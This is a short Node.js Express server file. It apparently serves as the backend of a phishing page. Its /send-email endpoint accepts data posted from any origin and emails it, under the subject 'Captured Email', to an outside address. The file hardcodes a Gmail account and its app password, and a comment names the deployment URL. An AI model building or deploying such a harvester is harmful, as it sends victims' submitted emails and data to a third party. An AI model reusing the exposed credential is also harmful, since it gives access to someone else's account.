const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors')
const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cors());

const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
   user:'mayowaandrews723@gmail.com',
    pass:'pydxhmlekrbhpens' 
  }
});
//https://average-trousers-jay.cyclic.cloud/send-email
app.post('/send-email', (req, res) => {
  const fdata = req.body;

  const mailOptions = {
    from: 'your-email@gmail.com',
    to: 'info@easyhostnet.com', // Replace with the recipient's email address
    subject: 'Captured Email',
    text: `user email is ${fdata}`
    
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('Email sent successfully');
    }
  });
});

const port = 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
